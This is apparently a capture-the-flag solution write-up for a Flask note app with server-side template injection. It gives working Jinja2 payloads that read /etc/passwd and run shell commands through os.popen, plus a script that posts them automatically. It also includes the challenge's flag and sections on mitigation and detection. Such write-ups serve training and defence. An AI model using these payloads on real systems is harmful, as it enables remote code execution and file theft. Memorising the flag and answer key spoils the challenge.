# Challenge 17: SSTINote - Solution

## Vulnerability Type
**Server-Side Template Injection (SSTI)**

## Description
The application renders user input directly as a Jinja2 template without sanitization, allowing attackers to execute arbitrary Python code on the server.

## Vulnerable Code
```python
# VULNERABLE: user input rendered as Jinja2 template
rendered = render_template_string(raw_input)
```

## Exploitation Steps

### Step 1: Verify SSTI Exists
Test basic template syntax:
```
{{7*7}}
```
Expected output: `49`

### Step 2: Access Flask Config
The flag is stored in Flask's config:
```
{{config}}
```
This will display all configuration including the FLAG.

### Step 3: Extract Flag Directly
```
{{config['FLAG']}}
```
Output: `FCTF{sst1_t3mpl4t3_1nj3ct10n}`

## Advanced SSTI Payloads

### Read Files
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
```

### Remote Code Execution (RCE)
```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

### Alternative RCE Payload
```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read() }}
```

### List Available Classes
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

### Access Request Object
```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

## Automated Exploitation

### Python Script
```python
import requests

url = "http://[host]/"
payloads = [
    "{{config['FLAG']}}",
    "{{config}}",
    "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /app/flag.txt').read() }}"
]

for payload in payloads:
    r = requests.post(url, data={"note": payload})
    if "FCTF{" in r.text:
        print(f"Success with payload: {payload}")
        print(r.text)
        break
```

## Flag
```
FCTF{sst1_t3mpl4t3_1nj3ct10n}
```

## How It Works
1. Jinja2 templates allow Python expressions in `{{ }}` blocks
2. User input is rendered as a template without sanitization
3. Attacker can access Python objects and methods
4. Through object introspection, attacker gains code execution
5. Flask's `config` object is accessible in template context

## SSTI Exploitation Chain
```
User Input → Jinja2 Template → Python Object Access → Code Execution
```

## Mitigation
- Never render user input as templates
- Use template sandboxing (though it can be bypassed)
- Separate data from templates:
  ```python
  # SAFE: Pass data as variables
  render_template('note.html', user_note=raw_input)
  ```
- Validate and sanitize all user input
- Use a whitelist of allowed template syntax
- Consider using a safer templating engine
- Implement Content Security Policy (CSP)
- Run application with minimal privileges
- Use template auto-escaping:
  ```python
  from markupsafe import escape
  safe_input = escape(raw_input)
  ```

## Detection
- Look for template syntax in user input fields
- Test with: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
- Monitor for unusual Python object access patterns
- Check for attempts to access `__class__`, `__mro__`, `__subclasses__`

## References
- [PortSwigger SSTI Guide](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
